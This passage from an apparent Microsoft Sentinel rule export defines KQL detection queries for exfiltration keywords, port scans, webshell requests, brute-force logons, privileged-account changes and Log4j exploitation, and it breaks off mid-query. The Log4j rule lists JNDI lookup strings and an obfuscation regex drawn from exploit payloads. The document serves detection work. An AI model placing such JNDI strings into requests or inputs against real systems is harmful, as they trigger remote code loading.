          "description": "This alert is triggered when an email with the subject containing specific word(s). For example 'resume' or 'job' words can be monitored. Customer to provide keywords to be monitored. MITRE: T1048 Category: Microsoft Defender XDR tag: RBA",
          "severity": "Informational",
          "enabled": false,
          "query": "let ingested_lookback =1d; // earliest [ingest time] boundary\n            let generated_lookback = 2d; // earliest [log time] boundary\n            OfficeActivity\n            | where TimeGenerated between (ago(generated_lookback) .. now ()) and ingestion_time() > ago(ingested_lookback)\n            | where RecordType =~ 'ExchangeItem'\n            | where Operation in~ ('Send', 'SendAs')\n            //Keywords must be configured\n            | where 'keyword1|keyword2' !in~ (KEYWORDS)\n            | extend ParsedItem = parse_json(Item)\n            | extend Subject = tostring(ParsedItem.Subject)\n            | extend MessageID = tostring(ParsedItem.InternetMessageId)\n            | extend MessageSize = toint(ParsedItem.SizeInBytes)\n            | where Subject has_any(KEYWORDS)\n            | parse MailboxOwnerUPN with UserName '@' UserUPNSuffix\n            | project Subject, UserName, UserUPNSuffix, TimeGenerated, MailboxOwnerUPN, MessageID, MessageSize, Client_IPAddress",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [
            "T1048"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UserUPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "Client_IPAddress"
                }
              ]
            },
            {
              "entityType": "MailMessage",
              "fieldMappings": [
                {
                  "identifier": "Sender",
                  "columnName": "MailboxOwnerUPN"
                },
                {
                  "identifier": "Subject",
                  "columnName": "Subject"
                },
                {
                  "identifier": "NetworkMessageId",
                  "columnName": "MessageID"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/8fd696b8-d184-472d-8ebf-f95a38497bd0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/8fd696b8-d184-472d-8ebf-f95a38497bd0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "DGA Daily Review",
          "description": "",
          "severity": "Informational",
          "enabled": false,
          "query": "Anomalies\n| where AnomalyTemplateName contains \"(Preview) Domain generation algorithm (DGA) on DNS domains\" \n\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0ded8e37-2bc1-4820-85d7-8f6b809d150b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0ded8e37-2bc1-4820-85d7-8f6b809d150b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] Enabled Account Without Password Set (14 Day Lookback)",
          "description": "NOTICE: This new rule replaces the previous \"AD user enabled and password not set within 48 hours\" rule.\n\nThis rule identifies user accounts that have been enabled (EventID 4722) in the last 14 days but have never had a password set.",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 14d;\nlet SecEvents = materialize (\n    SecurityEvent\n    | where TimeGenerated >= ago(starttime)\n    | where EventID in (4722, 4723)\n    | where TargetUserName !endswith \"$\"  // Exclude machine accounts\n    | distinct \n        TimeGenerated,\n        EventID,\n        TargetAccount,\n        TargetSid,\n        SubjectAccount,\n        Computer\n    );\n// User account enable events\nlet userEnable = SecEvents\n    | where EventID == 4722\n    | distinct \n        TimeEnabled = TimeGenerated,\n        TargetAccount,\n        TargetSid,\n        SubjectAccount,\n        Computer;\n// Password set attempt events\nlet userPwdSet = SecEvents\n    | where EventID == 4723\n    | distinct \n        TargetAccount,\n        TargetSid;\n// Join to find enabled accounts with NO matching password set\nlet suspiciousAccounts = \n    userEnable\n    | join kind=leftanti userPwdSet on TargetAccount, TargetSid\n    | extend DaysSinceEnabled = datetime_diff('day', now(), TimeEnabled)\n    | where DaysSinceEnabled >= 1;\n// Cross-check with IdentityInfo to ensure the account is enabled and not deleted\nsuspiciousAccounts\n| join kind=inner (\n    IdentityInfo\n    | where IsAccountEnabled == true and isnull(DeletedDateTime)\n    | distinct  AccountSID  // Retain original field name for clarity\n    )\n    on $left.TargetSid == $right.AccountSID\n| extend Reason = \"Account enabled but no password has ever been set\"\n| order by DaysSinceEnabled desc",
          "queryFrequency": "PT12H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/57b5c6f1-8ef6-486b-a081-0aee797c41e2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/57b5c6f1-8ef6-486b-a081-0aee797c41e2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "(DCSS Custom) - Port scan detected  (ASIM Network Session schema)",
          "description": "This rule is intended to replace the existing \"Port Scan Detected (ASIM Network Session schema)\" rule following successful testing and validation.\n\nThe updated rule identifies potential port scanning activity by external (non-private) IP addresses that attempt to scan multiple distinct ports within a 10-minute window. It then correlates these IPs with known threat intelligence feeds to flag potentially malicious behavior. The refined rule aims to reduce noise, making triaging more efficient and manageable. By identifying reconnaissance activity\u00e2\u20ac\u201da common precursor to attacks\u00e2\u20ac\u201dthis rule also provides valuable context by associating detected scanning IPs with known threats Intelligence.",
          "severity": "Medium",
          "enabled": false,
          "query": "let PortScanThreshold = 50; // Threshold for identifying potential port scans\n// Step 1: Detect potential port scanning activity\n_Im_NetworkSession\n| where TimeGenerated >= ago(48h)\n| where ipv4_is_private(SrcIpAddr) == False  // Exclude private IPs\n| where SrcIpAddr !in (\"127.0.0.1\", \"::1\")   // Exclude known trusted IPs\n| summarize\n    AttemptedPortsCount = dcount(DstPortNumber),  // Count distinct destination ports\n    AttemptedPorts = make_set(DstPortNumber, 100), // Capture a list of scanned ports\n    ReportedBy = make_set(strcat(EventVendor, \"/\", EventProduct), 20), // Reporting sources\n    RemoteDomain = any(RemoteDomain), // Get the RemoteDomain\n    EventResult = any(EventResult)    // Get the EventResult\n    by SrcIpAddr, bin(TimeGenerated, 10m)  // Group by source IP and time window\n| where AttemptedPortsCount > PortScanThreshold  // Filter for suspicious activity\n// Step 2: Correlate with known threat feeds\n| join kind=inner (\n    ThreatIntelligenceIndicator\n    | where Active == True and TimeGenerated >= ago(48h)  // Use only active threat indicators\n    | distinct NetworkSourceIP, ThreatType  // Extract relevant columns without duplicating rows\n) on $left.SrcIpAddr == $right.NetworkSourceIP  // Correlate with threat intelligence\n// Step 3: Output the required fields\n| project \n    SrcIpAddr,                     // Source IP address detected\n    AttemptedPortsCount,           // Number of distinct ports scanned\n    AttemptedPorts,                // List of scanned ports\n    ReportedBy,                    // Reporting source\n    ThreatType,                    // Associated threat type\n    TimeGenerated,                 // Time of detected activity\n    RemoteDomain,                  // Remote domain from _Im_NetworkSession\n    EventResult                    // Event result from _Im_NetworkSession",
          "queryFrequency": "PT1H",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Reconnaissance",
            "Discovery",
            "CommandAndControl"
          ],
          "techniques": [
            "T1595",
            "T1046",
            "T1090"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/536b9f8d-8e9f-4296-9432-e9de37747d44')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/536b9f8d-8e9f-4296-9432-e9de37747d44')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Malicious web application requests linked with Microsoft Defender for Endpoint (formerly Microsoft Defender ATP) alerts",
          "description": "Takes Microsoft Defender for Endpoint (formerly Microsoft Defender ATP) alerts where web scripts are present in the evidence and correlates with requests made to those scripts in the WCSIISLog to surface new alerts for potentially malicious web request activity.\nThe lookback for alerts is set to 1h and the lookback for W3CIISLogs is set to 7d. A sample set of popular web script extensions has been provided in scriptExtensions that should be tailored to your environment.",
          "severity": "Medium",
          "enabled": true,
          "query": "let alertTimeWindow = 1h;\nlet logTimeWindow = 7d;\n// Define script extensions that suit your web application environment - a sample are provided below\nlet scriptExtensions = dynamic([\".php\", \".jsp\", \".js\", \".aspx\", \".asmx\", \".asax\", \".cfm\", \".shtml\"]);\nlet alertData = materialize(SecurityAlert\n| where TimeGenerated > ago(alertTimeWindow)\n| where ProviderName == \"MDATP\"\n// Parse and expand the alert JSON\n| extend alertData = parse_json(Entities)\n| mvexpand alertData);\nlet fileData = alertData\n// Extract web script files from MDATP alerts - our malicious web scripts - candidate webshells\n| where alertData.Type =~ \"file\"\n| where alertData.Name has_any(scriptExtensions)\n| extend FileName = tostring(alertData.Name), Directory = tostring(alertData.Directory);\nlet hostData = alertData\n// Extract server details from alerts and map to alert id\n| where alertData.Type =~ \"host\"\n| project HostName = tostring(alertData.HostName), DnsDomain = tostring(alertData.DnsDomain), SystemAlertId\n| distinct HostName, DnsDomain, SystemAlertId;\n// Join the files on their impacted servers\nlet webshellData = fileData\n| join kind=inner (hostData) on SystemAlertId\n| project TimeGenerated, FileName, Directory, HostName, DnsDomain;\nwebshellData\n| join (\n// Find requests that were made to this file on the impacted server in the W3CIISLog table\nW3CIISLog\n| where TimeGenerated > ago(logTimeWindow)\n// Restrict to accesses to script extensions\n| where csUriStem has_any(scriptExtensions)\n| extend splitUriStem = split(csUriStem, \"/\")\n| extend FileName = splitUriStem[-1], HostName = sComputerName\n// Summarize potential attacker activity\n| summarize count(), StartTime=min(TimeGenerated), EndTime=max(TimeGenerated), RequestUserAgents=make_set(csUserAgent), ReqestMethods=make_set(csMethod), RequestStatusCodes=make_set(scStatus), RequestCookies=make_set(csCookie), RequestReferers=make_set(csReferer), RequestQueryStrings=make_set(csUriQuery) by AttackerIP=cIP, SiteName=sSiteName, ShellLocation=csUriStem, tostring(FileName), HostName\n) on FileName, HostName\n| project StartTime, EndTime, AttackerIP, RequestUserAgents, Computer = HostName, SiteName, ShellLocation, ReqestMethods, RequestStatusCodes, RequestCookies, RequestReferers, RequestQueryStrings, RequestCount = count_\n| extend HostName = tostring(split(Computer, \".\")[0]), DomainIndex = toint(indexof(Computer, '.'))\n| extend HostNameDomain = iff(DomainIndex != -1, substring(Computer, DomainIndex + 1), Computer)\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1505"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "fbfbf530-506b-49a4-81ad-4030885a195c",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostNameDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "AttackerIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.4"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/37bb9115-e1e5-40e0-86cd-2b2b13115ac9')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/37bb9115-e1e5-40e0-86cd-2b2b13115ac9')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Failed logon attempts in authpriv",
          "description": "Identifies failed logon attempts from unknown users in Syslog authpriv logs. The unknown user means the account that tried to log in isn't provisioned on the machine. A few hits could indicate someone attempting to access a machine they aren't authorized to access. \nIf there are many of hits, especially from outside your network, it could indicate a brute force attack. \nDefault threshold for logon attempts is 15.",
          "severity": "Medium",
          "enabled": true,
          "query": "let threshold = 15;\n// Below pulls messages from syslog-authpriv logs where there was an authentication failure with an unknown user.\n// IP address of system attempting logon is also extracted from the SyslogMessage field. Some of these messages\n// are aggregated.\nSyslog\n| where Facility =~ \"authpriv\"\n| where SyslogMessage has \"authentication failure\" and SyslogMessage has \" uid=0\"\n| extend RemoteIP = extract(@\".*?rhost=([\\d.]+).*?\", 1,SyslogMessage)\n| project TimeGenerated, Computer, ProcessName, HostIP, RemoteIP, ProcessID\n| join kind=innerunique (\n    // Below pulls messages from syslog-authpriv logs that show each instance an unknown user tried to logon. \n    Syslog \n    | where Facility =~ \"authpriv\"\n    | where SyslogMessage has \"user unknown\"\n    | project Computer, HostIP, ProcessID\n    ) on Computer, HostIP, ProcessID\n// Count the number of failed logon attempts by External IP and internal machine\n| summarize FirstLogonAttempt = min(TimeGenerated), LatestLogonAttempt = max(TimeGenerated), TotalLogonAttempts = count() by Computer, HostIP, RemoteIP\n// Calculate the time between first and last logon attempt (AttemptPeriodLength)\n| extend TimeBetweenLogonAttempts = LatestLogonAttempt - FirstLogonAttempt\n| where TotalLogonAttempts >= threshold\n| project FirstLogonAttempt, LatestLogonAttempt, TimeBetweenLogonAttempts, TotalLogonAttempts, SourceAddress = RemoteIP, Computer,  HostIP\n| sort by Computer asc nulls last\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CredentialAccess"
          ],
          "techniques": [
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "e7ec9fa6-e7f7-41ed-a34b-b956837a3ee6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "Computer"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "HostIP"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/bdd2c337-efd4-4679-adcb-cebe77922a30')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/bdd2c337-efd4-4679-adcb-cebe77922a30')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Authentication Method Changed for Privileged Account",
          "description": "Identifies authentication methods being changed for a privileged account. This could be an indication of an attacker adding an auth method to the account so they can have continued access.\nRef : https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#things-to-monitor-1",
          "severity": "High",
          "enabled": true,
          "query": "let VIPUsers = (IdentityInfo\n| where AssignedRoles contains \"Admin\"\n| summarize by tolower(AccountUPN));\nAuditLogs\n| where TimeGenerated > ago(2h)\n| where Category =~ \"UserManagement\"\n| where ActivityDisplayName =~ \"User registered security info\"\n| where LoggedByService =~ \"Authentication Methods\"\n| extend TargetUserPrincipalName = tostring(TargetResources[0].userPrincipalName)\n| where tolower(TargetUserPrincipalName) in (VIPUsers)\n| extend TargetAadUserId = tostring(TargetResources[0].id)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIPAddress = tostring(InitiatedBy.user.ipAddress)\n| extend TargetAccountName = tostring(split(TargetUserPrincipalName, \"@\")[0]), TargetAccountUPNSuffix = tostring(split(TargetUserPrincipalName, \"@\")[1])\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n",
          "queryFrequency": "PT2H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "feb0a2fb-ae75-4343-8cbc-ed545f1da289",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "TargetAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.5"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0271372a-c777-467d-a679-c8cb437966e9')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0271372a-c777-467d-a679-c8cb437966e9')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Account Elevated to New Role",
          "description": "Detects an account that is elevated to a new role where that account has not had that role in the last 14 days.\n  Role elevations are a key mechanism for gaining permissions, monitoring which users have which roles, and for anomalies in those roles is useful for finding suspicious activity.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts",
          "severity": "Medium",
          "enabled": true,
          "query": "let auditList =\nAuditLogs\n| where TimeGenerated >= ago(14d)\n| where OperationName =~ \"Add member to role completed (PIM activation)\"\n| where Result =~ \"success\"\n| extend TargetUserPrincipalName = tostring(TargetResources[2].userPrincipalName)\n| extend displayName = tostring(TargetResources[0].displayName)\n| extend displayName2 = tostring(TargetResources[3].displayName)\n| extend ElevatedRole = iif(displayName =~ \"Member\", displayName2, displayName)\n;\nlet lookbackList = auditList\n| where TimeGenerated between(ago(14d)..ago(1d))\n;\nlet recentList = auditList\n| where TimeGenerated > ago(1d)\n;\nlet newlyElevated = recentList\n| join kind = leftanti lookbackList on ElevatedRole, TargetUserPrincipalName\n;\nnewlyElevated | project Id, AdditionalDetails\n| mv-expand bagexpansion=array AdditionalDetails\n| evaluate bag_unpack(AdditionalDetails)\n| extend key = column_ifexists(\"key\", ''), value = column_ifexists(\"value\", '')\n| evaluate pivot(key, make_set(value))\n| extend ipaddr = todynamic(column_ifexists(\"ipaddr\", \"\"))\n| mv-expand ipaddr\n| project Id, InitiatingIPAddress = tostring(ipaddr)\n| join kind=rightouter newlyElevated on Id\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIPAddress = iff(isnotempty(tostring(InitiatedBy.user.ipAddress)), tostring(InitiatedBy.user.ipAddress), InitiatingIPAddress)\n| extend ElevatedBy = iff(isnotempty(InitiatingUserPrincipalName), InitiatingUserPrincipalName, InitiatingAppName)\n| extend ElevatedUser = TargetUserPrincipalName\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n| extend TargetAccountName = tostring(split(TargetUserPrincipalName, \"@\")[0]), TargetAccountUPNSuffix = tostring(split(TargetUserPrincipalName, \"@\")[1])\n| project-reorder ElevatedUser, ElevatedRole, ResultReason, ElevatedBy, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingIPAddress, TargetUserPrincipalName\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [
            "T1078.004"
          ],
          "alertRuleTemplateName": "c1c66f0b-5531-4a3e-a619-9d2f770ef730",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "InitiatingUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "InitiatingAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "InitiatingAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "InitiatingAadUserId"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "TargetUserPrincipalName"
                },
                {
                  "identifier": "Name",
                  "columnName": "TargetAccountName"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "TargetAccountUPNSuffix"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "InitiatingIPAddress"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.1.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c9b209fb-6c94-4d90-a561-0c97d201d6f2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c9b209fb-6c94-4d90-a561-0c97d201d6f2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "User agent search for log4j exploitation attempt",
          "description": "This query uses various log sources having user agent data to look for log4j CVE-2021-44228 exploitation attempt based on user agent pattern.\nLog4j is an open-source Apache logging library that is used in many Java-based applications. The regex and the string matching look for the most common attacks. This might not be comprehensive to detect every possible user agent variation.\n Reference: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/",
          "severity": "High",
          "enabled": true,
          "query": "let UserAgentString = dynamic ([\"${jndi:ldap:/\", \"${jndi:rmi:/\", \"${jndi:ldaps:/\", \"${jndi:dns:/\", \"${jndi:iiop:/\",\"${jndi:\",\"${jndi:nds:/\",\"${jndi:corba/\"]);\nlet UARegexMinimalString=dynamic(['{','%7b', '%7B']);\nlet UARegex = @'(\\\\$|%24)(\\\\{|%7B)([^jJ]*[jJ])([^nN]*[nN])([^dD]*[dD])([^iI]*[iI])(:|%3A|\\\\$|%24|}|%7D)';\n(union isfuzzy=true\n(OfficeActivity\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = ClientIP, Account = UserId, Type, Operation\n),\n(AzureDiagnostics\n| where Category in (\"FrontdoorWebApplicationFirewallLog\", \"FrontdoorAccessLog\", \"ApplicationGatewayFirewallLog\", \"ApplicationGatewayAccessLog\")\n| where userAgent_s has_any (UserAgentString) or userAgent_s matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent = userAgent_s, SourceIP = column_ifexists(\"clientIp_s\",clientIP_s), Type, column_ifexists(\"originalHost_s\",host_s), Url = requestUri_s, HttpStatus = column_ifexists(\"httpStatusDetails_s\",httpStatus_d), column_ifexists(\"trackingReference_s\",transactionId_g), ruleName_s, ResourceType, ResourceId\n),\n(\nW3CIISLog\n| where csUserAgent has_any (UserAgentString) or csUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent = csUserAgent, SourceIP = cIP, Account = csUserName, Type, sSiteName, csMethod, Url = csUriStem\n),\n(\nAWSCloudTrail\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = SourceIpAddress, Account = 